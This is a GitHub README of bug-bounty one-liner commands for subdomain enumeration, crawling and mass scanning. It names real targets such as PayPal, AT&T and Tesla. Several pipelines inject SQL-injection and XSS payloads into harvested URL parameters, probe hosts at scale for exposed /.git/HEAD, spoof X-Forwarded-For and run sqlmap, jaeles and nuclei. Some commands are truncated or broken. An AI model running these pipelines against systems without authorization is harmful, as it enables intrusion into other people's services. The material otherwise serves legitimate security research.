## 👑 What is KingOfOneLineTips Project ? 👑

Our main goal is to share tips from some well-known bughunters. Using recon methodology, we are able to find subdomains, apis, and tokens that are already exploitable, so we can report them. We wish to influence Onelinetips and explain the commands, for the better understanding of new hunters.

## Join Us
[![Telegram](https://patrolavia.github.io/telegram-badge/chat.png)](https://t.me/KingOfTipsBugBounty)

[![GitHub followers](https://img.shields.io/github/followers/bminossi.svg?style=social&label=Follow&maxAge=2592000)](https://github.com/bminossi?tab=followers) 
[![GitHub followers](https://img.shields.io/github/followers/OfJAAH.svg?style=social&label=Follow&maxAge=2592000)](https://github.com/OfJAAH?tab=followers)

## Special thanks

- [@Stokfredrik](https://twitter.com/stokfredrik)
- [@Jhaddix](https://twitter.com/Jhaddix)
- [@pdiscoveryio](https://twitter.com/pdiscoveryio)
- [@TomNomNom](https://twitter.com/TomNomNom)
- [@jeff_foley](https://twitter.com/@jeff_foley)
- [@NahamSec](https://twitter.com/NahamSec)
- [@j3ssiejjj](https://twitter.com/j3ssiejjj)


## Scripts that need to be installed

To run the project, you will need to install the following programs:

- [Anew](https://github.com/tomnomnom/anew)
- [Qsreplace](https://github.com/tomnomnom/qsreplace)
- [Subfinder](https://github.com/projectdiscovery/subfinder)
- [Gospider](https://github.com/jaeles-project/gospider)
- [Github-Search](https://github.com/gwen001/github-search)
- [Amass](https://github.com/OWASP/Amass)
- [Hakrawler](https://github.com/hakluke/hakrawler)
- [Gargs](https://github.com/brentp/gargs)
- [chaos](https://github.com/projectdiscovery/chaos-client)
- [httpx](https://github.com/encode/httpx)


###  Search Asn Amass

- [Explaining command](https://bit.ly/2EMooDB)

Amass intel will search the organization "paypal" from a database of ASNs at a faster-than-default rate. It will then take these ASN numbers and scan the complete ASN/IP space for all tld's in that IP space (paypal.com, paypal.co.id, paypal.me).

```bash
amass intel -org paypal -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500''
```

###  Using chaos search js


- [Explaining command](https://bit.ly/32vfRg7)

Chaos is an API by Project Discovery that discovers subdomains. Here we are querying thier API for all known subdoains of "att.com". We are then using httpx to find which of those domains is live and hosts an HTTP or HTTPs site. We then pass those URLs to GoSpider to visit them and crawl them for all links (javascript, endpoints, etc). We then grep to find all the JS files. We pipe this all through anew so we see the output iterativlely (faster) and grep for "(http|https)://att.com" to make sure we dont recieve output for domains that are not "att.com".

```bash
chaos -d att.com | httpx -silent | xargs -I@ -P20 sh -c 'gospider -a -s "@" -d 2' | grep -Eo "(http|https)://[^/"].*.js+" | sed "s#]
```

###  Search Subdomain using Gospider


- [Explaining command](https://bit.ly/2QtG9do)

GoSpider to visit them and crawl them for all links (javascript, endpoints, etc) we use some blacklist, so that it doesn’t travel, not to delay, grep is a command-line utility for searching plain-text data sets for lines that match a regular expression to search HTTP and HTTPS

```bash
gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```

###  Using gospider to chaos


- [Explaining command](https://bit.ly/2D4vW3W)

GoSpider to visit them and crawl them for all links (javascript, endpoints, etc) chaos is a subdomain search project, to use it needs the api, to xargs is a command on Unix and most Unix-like operating systems used to build and execute commands from standard input.


```bash
chaos -d paypal.com -bbq -filter-wildcard -http-url | xargs -I@ -P5 sh -c 'gospider -a -s "@" -d 3'
```

###  Using recon.dev and gospider crawler subdomains

- [Explaining command](https://bit.ly/32pPRDa)

```bash
curl "https://recon.dev/api/search?key=apiKEY&domain=paypal.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | anew |httpx -silent | xargs -I@ gospider -d 0 -s @ -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew'
```

###  PSQL - search subdomain using cert.sh

- [Explaining command](https://bit.ly/32rMA6e)

```bash
psql -A -F , -f querycrt -h http://crt.sh -p 5432 -U guest certwatch 2>/dev/null | tr ', ' '\n' | grep twitch | anew'
```

###  Search subdomains using github and httpx

- [Github-search](https://github.com/gwen001/github-search)

Using python3 to search subdomains, httpx filter hosts by up status-code response (200)

```python
./github-subdomains.py -t APYKEYGITHUB -d domaintosearch | httpx --title
```

###  Search SQLINJECTION using qsreplace search syntax error

- [Explained comand](https://bit.ly/3hxFWS2)

```bash
grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
```

###  Search subdomains using jldc

- [Explained comand](https://bit.ly/2YBlEjm)

```bash
curl -s "https://jldc.me/anubis/subdomains/att.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
```

###  Search subdomains in assetfinder using hakrawler spider to search links in content responses

- [Explained comand](https://bit.ly/3hxRvZw)

```bash
assetfinder -subs-only tesla.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep "tesla"
```

###  Search subdomains in cert.sh

- [Explained comand](https://bit.ly/2QrvMXl)

```bash
curl -s "https://crt.sh/?q=%25.att.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | httpx -title -silent | anew
```

###  Search subdomains in cert.sh assetfinder to search in link /.git/HEAD

- [Explained comand](https://bit.ly/3lhFcTH)

```bash
curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
```bash
curl -s "https://crt.sh/?q=%25.enjoei.com.br&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | httpx -silent -path /.git/HEAD -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
###  Collect js files from hosts up by gospider

- [Explained comand](https://bit.ly/3aWIwyI)

```bash
xargs -P 500 -a pay -I@ sh -c 'nc -w1 -z -v @ 443 2>/dev/null && echo @' | xargs -I@ -P10 sh -c 'gospider -a -s "https://@" -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" | anew'
```

###  Subdomain search Bufferover resolving domain to httpx

- [Explained comand](https://bit.ly/3lno9j0)

```bash
curl -s https://dns.bufferover.run/dns?q=.sony.com |jq -r .FDNS_A[] | sed -s 's/,/\n/g' | httpx -silent | anew
```

###  Using gargs to gospider search with parallel proccess
- [Gargs](https://github.com/brentp/gargs)

- [Explained comand](https://bit.ly/2EHj1FD)

```bash
httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -l domain -timeout 5 -threads 200 --follow-redirects -silent | gargs -p 3 'gospider -m 5 --blacklist pdf -t 2 -c 300 -d 5 -a -s {}' | anew stepOne
```

###  Injection xss using qsreplace to urls filter to gospider

- [Explained comand](https://bit.ly/3joryw9)

```bash
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```

###  Extract URL's to apk

- [Explained comand](https://bit.ly/2QzXwJr)

```bash
apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|schemas.android\|google\|goo.gl"
```

###  Chaos to Gospider

- [Explained comand](https://bit.ly/3gFJbpB)

```bash
chaos -d att.com -o att -silent | httpx -silent | xargs -P100 -I@ gospider -c 30 -t 15 -d 4 -a -H "x-forwarded-for: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" -s @
```

###  Checking invalid certificate

- [Real script](https://bit.ly/2DhAwMo)
- [Script King](https://bit.ly/34Z0kIH)

```bash
xargs -a domain -P1000 -I@ sh -c 'bash cert.sh @ 2> /dev/null' | grep "EXPIRED" | awk '/domain/{print $5}' | httpx
```

###  Using shodan & Nuclei

- [Explained comand](https://bit.ly/3jslKle)

Shodan is a search engine that lets the user find specific types of computers connected to the internet, AWK Cuts the text and prints the third column.
httpx is a fast and multi-purpose HTTP using -silent. Nuclei is a fast tool for configurable targeted scanning based on templates offering massive extensibility and ease of use, You need to download the nuclei templates.

```bash
shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
```

###  Open Redirect test using gf.

- [Explained comand](https://bit.ly/3hL263x)

echo is a command that outputs the strings it is being passed as arguments. What to Waybackurls? Accept line-delimited domains on stdin, fetch known URLs from the Wayback Machine for .domain.com and output them on stdout. Httpx? is a fast and multi-purpose HTTP. GF? A wrapper around grep to avoid typing common patterns and anew Append lines from stdin to a file, but only if they don't already appear in the file. Outputs new lines to stdout too, removes duplicates.

```bash
echo "domain" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
```

###  Using shodan to jaeles "How did I find a critical today? well as i said it was very simple, using shodan and jaeles".

- [Explained comand](https://bit.ly/2QQfY0l)

```bash
shodan domain domain| awk '{print $3}'|  httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @
```
###  Using Chaos to jaeles "How did I find a critical today?.

- [Explained comand](https://bit.ly/2YXiK8N)

To chaos this project to projectdiscovery, Recon subdomains, using httpx, if we see the output from chaos domain.com we need it to be treated as http or https, so we use httpx to get the results. We use anew, a tool that removes duplicates from @TomNomNom, to get the output treated for import into jaeles, where he will scan using his templates. 

```bash
chaos -d domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @ 
```

###  Using shodan to jaeles

- [Explained comand](https://bit.ly/2Dkmycu)

```bash
domain="domaintotest";shodan domain $domain | awk -v domain="$domain" '{print $1"."domain}'| httpx -threads 300 | anew shodanHostsUp | xargs -I@ -P3 sh -c 'jaeles -c 300 scan -s jaeles-signatures/ -u @'| anew JaelesShodanHosts 
```

###  Search to files using assetfinder and ffuf

- [Explained comand](https://bit.ly/2Go3Ba4)

```bash
assetfinder att.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'
```

###  HTTPX using new mode location and injection XSS using qsreplace.

- [Explained comand](https://bit.ly/2Go3Ba4)

```bash
httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo '(http|https)://[^/"].*' | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>" "'
```

###  Grap internal juicy paths and do requests to them.

- [Explained comand](https://bit.ly/357b1IY)

```bash
export domain="https://target";gospider -s $domain -d 3 -c 300 | awk '/linkfinder/{print $NF}' | grep -v "http" | grep -v "http" | unfurl paths | anew | xargs -I@ -P50 sh -c 'echo $domain@ | httpx -silent -content-length'
```

###  Download to list bounty targets We inject using the sed .git/HEAD command at the end of each url.

- [Explained comand](https://bit.ly/2R2gNn5)

```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```

###  Using to findomain to SQLINJECTION.

- [Explained comand](https://bit.ly/2ZeAhcF)

```bash
findomain -t testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
```


# Project

[![made-with-Go](https://img.shields.io/badge/Made%20with-Go-1f425f.svg)](http://golang.org)
[![made-with-bash](https://img.shields.io/badge/Made%20with-Bash-1f425f.svg)](https://www.gnu.org/software/bash/)
[![Open Source? Yes!](https://badgen.net/badge/Open%20Source%20%3F/Yes%21/blue?icon=github)](https://github.com/Naereen/badges/)
[![The King](https://aleen42.github.io/badges/src/twitter.svg)](https://twitter.com/ofjaaah)
[![The King](https://aleen42.github.io/badges/src/twitter.svg)](https://twitter.com/zeroc00I)
[![The King](https://aleen42.github.io/badges/src/twitter.svg)](https://twitter.com/willxenoo)
[![Telegram](https://patrolavia.github.io/telegram-badge/chat.png)](https://t.me/KingOfTipsBugBounty)




<a href="https://www.buymeacoffee.com/OFJAAAH" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 20px !important;width: 50px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>



